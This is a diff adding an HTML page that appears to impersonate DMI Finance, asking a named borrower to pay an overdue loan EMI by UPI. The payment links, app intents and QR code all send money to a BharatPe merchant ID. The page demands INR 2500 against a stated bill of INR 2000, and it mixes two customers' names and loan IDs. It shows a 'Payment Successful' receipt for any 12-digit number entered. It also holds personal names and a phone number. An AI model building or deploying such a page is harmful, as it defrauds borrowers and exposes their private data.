@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>DMI Finance - Overdue Payment</title>
+    <!-- Load Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Load Google Font: Inter -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+    <style>
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 min-h-screen flex justify-center items-start sm:py-6">
+
+    <!-- Mobile App Frame Container -->
+    <div class="w-full max-w-[430px] min-h-screen sm:min-h-[820px] bg-white sm:rounded-3xl sm:shadow-xl overflow-hidden flex flex-col justify-between relative">
+
+        <!-- Top Wrapper (Header + Details Card + Pay Button) -->
+        <div class="w-full flex flex-col items-center">
+
+            <!-- Header Banner (#D3D5D4) -->
+            <header class="w-full bg-[#D3D5D4] py-7 px-6 flex items-center justify-center">
+                <div class="flex items-center gap-3.5 select-none">
+                    <!-- DMI Finance Vector Logo -->
+                    <svg class="w-[74px] h-[54px] shrink-0" viewBox="0 0 120 88" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="DMI Finance Logo">
+                        <path d="M22 10C66 10 112 24 114 52C116 74 72 82 14 82L18 71C64 70 98 63 97 48C96 29 58 15 22 10Z" fill="#0B3B9D" />
+                        <path d="M23 47L36 44L27 76L14 78L23 47Z" fill="#0B3B9D" />
+                        <path d="M40 43L52 40L44 72L32 74L40 43Z" fill="#0B3B9D" />
+                        <path d="M56 39L68 36L60 67L48 70L56 39Z" fill="#0B3B9D" />
+                        <path d="M72 35L83 32L76 61L64 64L72 35Z" fill="#0B3B9D" />
+                        <path d="M86 31L96 28L91 49L81 52L86 31Z" fill="#0B3B9D" />
+                    </svg>
+                    <!-- Brand Typography -->
+                    <div class="flex flex-col leading-[0.95] tracking-tight text-[#232323]">
+                        <span class="text-[28px] font-black">DMI</span>
+                        <span class="text-[27px] font-black">FINANCE</span>
+                    </div>
+                </div>
+            </header>
+
+            <!-- Main Content Area -->
+            <main class="w-full px-5 pt-6 pb-8 flex flex-col items-center">
+
+                <!-- Customer & Bill Statement Card (#D8DADA) -->
+                <section aria-label="Customer Payment Details" class="w-full bg-[#D8DADA] rounded-2xl p-6 text-left shadow-2xs space-y-2.5">
+                    <!-- Row 1: Customer Name -->
+                    <div class="grid grid-cols-[46%_54%] items-baseline gap-1 text-[16px] sm:text-[17px]">
+                        <span class="text-gray-800 font-medium">Customer Name:</span>
+                        <span class="font-bold text-black">Nasiruddin</span>
+                    </div>
+
+                    <!-- Row 2: DMI Loan ID -->
+                    <div class="grid grid-cols-[46%_54%] items-baseline gap-1 text-[16px] sm:text-[17px]">
+                        <span class="text-gray-800 font-medium">DMI Loan ID:</span>
+                        <span class="font-bold text-black">DMI0054233536</span>
+                    </div>
+
+                    <!-- Row 3: Customer Contact -->
+                    <div class="grid grid-cols-[46%_54%] items-baseline gap-1 text-[16px] sm:text-[17px]">
+                        <span class="text-gray-800 font-medium">Customer Contact:</span>
+                        <span class="font-bold text-black">+91 88640 44039</span>
+                    </div>
+
+                    <!-- Row 4: Source -->
+                    <div class="grid grid-cols-[46%_54%] items-baseline gap-1 text-[16px] sm:text-[17px]">
+                        <span class="text-gray-800 font-medium">Source:</span>
+                        <span class="font-bold text-black">Samsung Mobility</span>
+                    </div>
+
+                    <!-- Row 5: Bill Date -->
+                    <div class="grid grid-cols-[46%_54%] items-baseline gap-1 text-[15px] sm:text-[16px] pt-1">
+                        <span class="text-gray-800 font-medium">Bill Date:</span>
+                        <span class="text-gray-900 font-medium">22 November 2026</span>
+                    </div>
+
+                    <!-- Row 6: EMI -->
+                    <div class="grid grid-cols-[46%_54%] items-baseline gap-1 text-[15px] sm:text-[16px]">
+                        <span class="text-gray-800 font-medium">EMI:</span>
+                        <span class="text-gray-900 font-medium">1604.05</span>
+                    </div>
+
+                    <!-- Row 7: Bounce Charge -->
+                    <div class="grid grid-cols-[46%_54%] items-baseline gap-1 text-[15px] sm:text-[16px]">
+                        <span class="text-gray-800 font-medium">Bounce Charge:</span>
+                        <span class="text-gray-900 font-medium">Cleared</span>
+                    </div>
+
+                    <!-- Row 8: Penalty Charge -->
+                    <div class="grid grid-cols-[46%_54%] items-baseline gap-1 text-[15px] sm:text-[16px]">
+                        <span class="text-gray-800 font-medium">Penalty Charge:</span>
+                        <span class="text-gray-900 font-medium">Cleared</span>
+                    </div>
+
+                    <!-- Row 9: Non-NACH Fee -->
+                    <div class="grid grid-cols-[46%_54%] items-baseline gap-1 text-[15px] sm:text-[16px]">
+                        <span class="text-gray-800 font-medium">Non-NACH Fee:</span>
+                        <span class="text-gray-900 font-medium">Cleared</span>
+                    </div>
+
+                    <!-- Row 10: Collection Agent -->
+                    <div class="grid grid-cols-[46%_54%] items-baseline gap-1 text-[15px] sm:text-[16px]">
+                        <span class="text-gray-800 font-medium">Collection Agent:</span>
+                        <span class="text-gray-900 font-medium">MD ADNAN</span>
+                    </div>
+
+                    <div class="border-t border-gray-400/50 my-2 pt-2"></div>
+
+                    <!-- Row 11: Bill Amount -->
+                    <div class="grid grid-cols-[46%_54%] items-baseline gap-1 text-[17px] sm:text-[18px]">
+                        <span class="text-gray-900 font-medium">Bill Amount:</span>
+                        <span class="font-bold text-black">INR 2000.00</span>
+                    </div>
+                </section>
+
+                <!-- Payment Status Banner (Shown if Failed/Cancelled) -->
+                <div id="paymentStatusBanner" class="hidden w-full mt-4 bg-red-50 border border-red-200 text-red-700 rounded-xl px-4 py-3 text-xs font-medium text-center">
+                    Payment was cancelled or failed. Please complete the UPI payment to generate your receipt.
+                </div>
+
+                <!-- Primary Native UPI Anchor Action Button -->
+                <a 
+                    id="payButton"
+                    href="upi://pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR"
+                    onclick="handlePrimaryUpiClick(event)"
+                    class="w-full h-[68px] mt-5 bg-[#0B4863] hover:bg-[#08374D] active:scale-[0.99] transition-all duration-150 rounded-xl flex items-center justify-center text-white text-[22px] font-bold tracking-wide shadow-sm cursor-pointer focus:outline-none focus:ring-4 focus:ring-[#0B4863]/30"
+                >
+                    Pay 2500.00
+                </a>
+
+                <!-- Direct App-Specific UPI Intent Quick Launchers -->
+                <div id="quickUpiApps" class="mt-4 w-full">
+                    <p class="text-xs font-medium text-gray-500 text-center mb-2.5">Or pay directly via UPI app</p>
+                    <div class="grid grid-cols-4 gap-2">
+                        <!-- Google Pay -->
+                        <a 
+                            href="tez://upi/pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR"
+                            onclick="handleAppSpecificClick(event, 'tez://upi/pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR')"
+                            class="flex flex-col items-center justify-center py-2.5 px-1.5 bg-white border border-gray-200 hover:border-[#0B4863] rounded-xl shadow-2xs active:scale-95 transition-all"
+                        >
+                            <span class="w-7 h-7 rounded-full bg-blue-50 text-blue-600 font-extrabold text-xs flex items-center justify-center mb-1">G</span>
+                            <span class="text-[11px] font-semibold text-gray-800">GPay</span>
+                        </a>
+
+                        <!-- PhonePe -->
+                        <a 
+                            href="phonepe://pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR"
+                            onclick="handleAppSpecificClick(event, 'phonepe://pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR')"
+                            class="flex flex-col items-center justify-center py-2.5 px-1.5 bg-white border border-gray-200 hover:border-[#0B4863] rounded-xl shadow-2xs active:scale-95 transition-all"
+                        >
+                            <span class="w-7 h-7 rounded-full bg-purple-50 text-purple-700 font-extrabold text-xs flex items-center justify-center mb-1">Pe</span>
+                            <span class="text-[11px] font-semibold text-gray-800">PhonePe</span>
+                        </a>
+
+                        <!-- Paytm -->
+                        <a 
+                            href="paytmmp://pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR"
+                            onclick="handleAppSpecificClick(event, 'paytmmp://pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR')"
+                            class="flex flex-col items-center justify-center py-2.5 px-1.5 bg-white border border-gray-200 hover:border-[#0B4863] rounded-xl shadow-2xs active:scale-95 transition-all"
+                        >
+                            <span class="w-7 h-7 rounded-full bg-sky-50 text-sky-600 font-extrabold text-[11px] flex items-center justify-center mb-1">Pay</span>
+                            <span class="text-[11px] font-semibold text-gray-800">Paytm</span>
+                        </a>
+
+                        <!-- Any UPI App -->
+                        <a 
+                            href="upi://pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR"
+                            onclick="handlePrimaryUpiClick(event)"
+                            class="flex flex-col items-center justify-center py-2.5 px-1.5 bg-white border border-gray-200 hover:border-[#0B4863] rounded-xl shadow-2xs active:scale-95 transition-all"
+                        >
+                            <span class="w-7 h-7 rounded-full bg-[#0B4863]/10 text-[#0B4863] font-extrabold text-[11px] flex items-center justify-center mb-1">UPI</span>
+                            <span class="text-[11px] font-semibold text-gray-800">Any UPI</span>
+                        </a>
+                    </div>
+                </div>
+
+                <!-- Post-Payment UTR Verification Box (Appears after returning from UPI App) -->
+                <div id="utrVerificationCard" class="hidden w-full mt-5 bg-emerald-50/70 border border-emerald-200 rounded-2xl p-4 text-left">
+                    <p class="text-xs font-bold text-emerald-900">Completed payment in your UPI app?</p>
+                    <p class="text-[11px] text-emerald-700 mt-0.5">Enter the 12-digit UPI Reference / UTR number from your payment receipt to confirm &amp; view your Successful receipt.</p>
+                    <div class="mt-2.5 flex gap-2">
+                        <input
+                            id="utrInput"
+                            type="text"
+                            inputmode="numeric"
+                            maxlength="12"
+                            placeholder="Enter 12-digit UTR No."
+                            class="w-full px-3 py-2 text-xs font-semibold text-gray-900 bg-white border border-emerald-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-emerald-500"
+                        />
+                        <button
+                            type="button"
+                            onclick="verifyAndShowSuccess()"
+                            class="shrink-0 px-4 py-2 bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold rounded-lg transition-colors cursor-pointer"
+                        >
+                            Verify
+                        </button>
+                    </div>
+                    <p id="utrErrorMsg" class="hidden text-[11px] text-red-600 font-medium mt-1.5">Please enter a valid 12-digit UPI UTR / Reference number.</p>
+                </div>
+
+            </main>
+        </div>
+
+        <!-- Bottom Contact Bar (#0B4863) -->
+        <footer class="w-full bg-[#0B4863] text-white py-3.5 px-4 text-center mt-auto shrink-0">
+            <p class="text-[13.5px] sm:text-[14px] leading-snug font-normal">
+                For any queries, please contact <strong class="font-bold">DMI Finance</strong>
+            </p>
+            <p class="text-[13.5px] sm:text-[14px] leading-snug mt-0.5 flex flex-wrap justify-center items-center gap-x-3 gap-y-1">
+                <a href="tel:28064807777" class="hover:underline tracking-wide">28064807777</a>
+                <a href="mailto:customercare@dmifinance.in" class="hover:underline">customercare@dmifinance.in</a>
+            </p>
+        </footer>
+    </div>
+
+    <!-- Desktop / Unsupported Browser UPI QR & Copy Fallback Modal -->
+    <div id="upiModal" class="fixed inset-0 bg-black/60 backdrop-blur-xs hidden items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-2xl max-w-sm w-full p-5 shadow-2xl border border-gray-100 relative animate-fade-in">
+            <div class="flex items-center justify-between border-b border-gray-100 pb-3">
+                <div>
+                    <h2 class="text-base font-bold text-gray-900">Scan & Pay via UPI</h2>
+                    <p class="text-xs text-gray-500">Customer: <span class="font-semibold text-gray-800">Chandan Das Yadav Priy (DMI0052405388)</span></p>
+                </div>
+                <button
+                    type="button"
+                    onclick="closeUpiModal()"
+                    aria-label="Close modal"
+                    class="w-8 h-8 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center text-gray-600 font-bold transition-colors"
+                >
+                    ✕
+                </button>
+            </div>
+
+            <div class="my-4 flex flex-col items-center">
+                <div class="bg-[#0B4863]/5 border border-[#0B4863]/20 rounded-xl px-4 py-2 mb-3 text-center w-full">
+                    <span class="text-xs text-gray-600 block">Payable Amount</span>
+                    <span class="text-2xl font-extrabold text-[#0B4863]">₹ 2,500.00</span>
+                </div>
+
+                <!-- Dynamic UPI QR Code -->
+                <div class="p-3 bg-white border-2 border-gray-200 rounded-2xl shadow-xs">
+                    <img
+                        src="https://api.qrserver.com/v1/create-qr-code/?size=190x190&data=upi%3A%2F%2Fpay%3Fpa%3DBHARATPE09917548991%40yesbankltd%26pn%3DDMI%2520Finance%26am%3D2500.00%26cu%3DINR"
+                        alt="DMI Finance UPI QR Code"
+                        onerror="this.src='https://placehold.co/190x190/0B4863/FFFFFF?text=UPI+QR+Code'"
+                        class="w-44 h-44 rounded-lg object-contain"
+                    />
+                </div>
+                <p class="text-[11px] text-gray-500 mt-2 text-center">Scan with GPay, PhonePe, Paytm, or any UPI app</p>
+            </div>
+
+            <!-- Copy UPI ID Box -->
+            <div class="bg-gray-50 border border-gray-200 rounded-xl p-2.5 flex items-center justify-between gap-2">
+                <div class="overflow-hidden">
+                    <span class="text-[10px] uppercase tracking-wider text-gray-400 font-semibold block">Business UPI ID</span>
+                    <span class="text-xs font-bold text-gray-800 truncate block">BHARATPE09917548991@yesbankltd</span>
+                </div>
+                <button
+                    id="copyUpiBtn"
+                    type="button"
+                    onclick="copyUpiId()"
+                    class="shrink-0 px-3 py-1.5 bg-white border border-gray-300 hover:border-[#0B4863] text-[#0B4863] text-xs font-bold rounded-lg transition-all cursor-pointer"
+                >
+                    Copy UPI
+                </button>
+            </div>
+
+            <a
+                href="upi://pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR"
+                class="mt-3 w-full py-3 bg-[#0B4863] hover:bg-[#08374D] text-white font-bold text-sm rounded-xl flex items-center justify-center transition-colors"
+            >
+                Open Installed UPI App
+            </a>
+        </div>
+    </div>
+
+    <!-- Verified Payment Successful Receipt Modal (Only triggered on confirmed SUCCESS) -->
+    <div id="successModal" class="fixed inset-0 bg-black/65 backdrop-blur-xs hidden items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-2xl max-w-sm w-full p-6 shadow-2xl border border-emerald-100 text-center relative">
+            <div class="w-16 h-16 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center mx-auto mb-3 shadow-inner">
+                <svg class="w-9 h-9" fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+                </svg>
+            </div>
+            <span class="inline-block px-3 py-0.5 bg-emerald-50 text-emerald-700 text-[11px] font-bold uppercase tracking-wider rounded-full border border-emerald-200 mb-1">
+                Payment Successful
+            </span>
+            <h2 class="text-xl font-extrabold text-gray-900">INR 2,500.00 Paid</h2>
+            <p class="text-xs text-gray-500 mt-1">Thank you! Your EMI settlement payment to <strong class="text-gray-800">DMI Finance</strong> has been received.</p>
+
+            <div class="mt-4 bg-gray-50 rounded-xl p-3.5 text-left space-y-2 border border-gray-200 text-xs">
+                <div class="flex justify-between">
+                    <span class="text-gray-500">Customer Name:</span>
+                    <span class="font-bold text-gray-900">Chandan Das Yadav Priy</span>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-gray-500">DMI Loan ID:</span>
+                    <span class="font-bold text-gray-900">DMI0052405388</span>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-gray-500">Source:</span>
+                    <span class="font-bold text-gray-900">Samsung Mobility</span>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-gray-500">UPI Ref / UTR:</span>
+                    <span id="receiptUtrValue" class="font-bold text-emerald-700">--</span>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-gray-500">Status:</span>
+                    <span class="font-bold text-emerald-600">SUCCESSFUL</span>
+                </div>
+            </div>
+
+            <button
+                type="button"
+                onclick="closeSuccessModal()"
+                class="mt-5 w-full py-3 bg-[#0B4863] hover:bg-[#08374D] text-white font-bold text-sm rounded-xl transition-colors cursor-pointer"
+            >
+                Done
+            </button>
+        </div>
+    </div>
+
+    <!-- Interactive Script for UPI Deep Link, Return Status & Verified Success Receipt -->
+    <script>
+        const UPI_INTENT_URL = 'upi://pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR';
+        const UPI_ID = 'BHARATPE09917548991@yesbankltd';
+        let initiatedUpiPayment = false;
+
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        function getUpiModal() {
+            return document.getElementById('upiModal');
+        }
+
+        function openUpiModal() {
+            const modal = getUpiModal();
+            if (!modal) return;
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+        }
+
+        function closeUpiModal() {
+            const modal = getUpiModal();
+            if (!modal) return;
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
+        }
+
+        function showSuccessScreen(utrNumber) {
+            const successModal = document.getElementById('successModal');
+            const receiptUtr = document.getElementById('receiptUtrValue');
+            const statusBanner = document.getElementById('paymentStatusBanner');
+            if (statusBanner) statusBanner.classList.add('hidden');
+            if (receiptUtr) receiptUtr.textContent = utrNumber || 'CONFIRMED';
+            if (successModal) {
+                successModal.classList.remove('hidden');
+                successModal.classList.add('flex');
+            }
+        }
+
+        function closeSuccessModal() {
+            const successModal = document.getElementById('successModal');
+            if (successModal) {
+                successModal.classList.add('hidden');
+                successModal.classList.remove('flex');
+            }
+        }
+
+        function verifyAndShowSuccess() {
+            const utrInput = document.getElementById('utrInput');
+            const utrErrorMsg = document.getElementById('utrErrorMsg');
+            const utrVal = (utrInput ? utrInput.value : '').trim();
+
+            if (!/^\d{12}$/.test(utrVal)) {
+                if (utrErrorMsg) utrErrorMsg.classList.remove('hidden');
+                return;
+            }
+            if (utrErrorMsg) utrErrorMsg.classList.add('hidden');
+            showSuccessScreen(utrVal);
+        }
+
+        function handlePrimaryUpiClick(event) {
+            initiatedUpiPayment = true;
+            if (!isMobileDevice()) {
+                event.preventDefault();
+                openUpiModal();
+            }
+        }
+
+        function handleAppSpecificClick(event, appUri) {
+            initiatedUpiPayment = true;
+            if (!isMobileDevice()) {
+                event.preventDefault();
+                openUpiModal();
+                return;
+            }
+            setTimeout(() => {
+                if (!document.hidden) {
+                    window.location.href = UPI_INTENT_URL;
+                }
+            }, 900);
+        }
+
+        // Detect when user returns from UPI app to browser tab
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden && initiatedUpiPayment) {
+                const utrCard = document.getElementById('utrVerificationCard');
+                if (utrCard) {
+                    utrCard.classList.remove('hidden');
+                }
+            }
+        });
+
+        // Handle payment gateway/app redirect callback URL parameters (?status=SUCCESS&txnRef=123456789012)
+        window.addEventListener('DOMContentLoaded', () => {
+            const params = new URLSearchParams(window.location.search);
+            const status = (params.get('status') || params.get('Status') || '').toUpperCase();
+            const txnRef = params.get('txnRef') || params.get('utr') || params.get('ApprovalRefNo') || '';
+
+            // Show Success ONLY when status explicitly equals SUCCESS (never on FAILED or CANCELLED)
+            if (status === 'SUCCESS') {
+                showSuccessScreen(txnRef || 'UPI-VERIFIED');
+            } else if (status === 'FAILED' || status === 'FAILURE' || status === 'CANCELLED' || status === 'ABORTED') {
+                const statusBanner = document.getElementById('paymentStatusBanner');
+                if (statusBanner) statusBanner.classList.remove('hidden');
+            }
+        });
+
+        function copyUpiId() {
+            const btn = document.getElementById('copyUpiBtn');
+            const tempInput = document.createElement('input');
+            tempInput.value = UPI_ID;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempInput);
+
+            if (btn) {
+                const originalText = btn.textContent;
+                btn.textContent = 'Copied!';
+                btn.classList.add('bg-emerald-50', 'text-emerald-700', 'border-emerald-300');
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                    btn.classList.remove('bg-emerald-50', 'text-emerald-700', 'border-emerald-300');
+                }, 2000);
+            }
+        }
+
+        window.addEventListener('click', (e) => {
+            const modal = getUpiModal();
+            if (modal && e.target === modal) {
+                closeUpiModal();
+            }
+        });
+    </script>
+</body>
+</html>
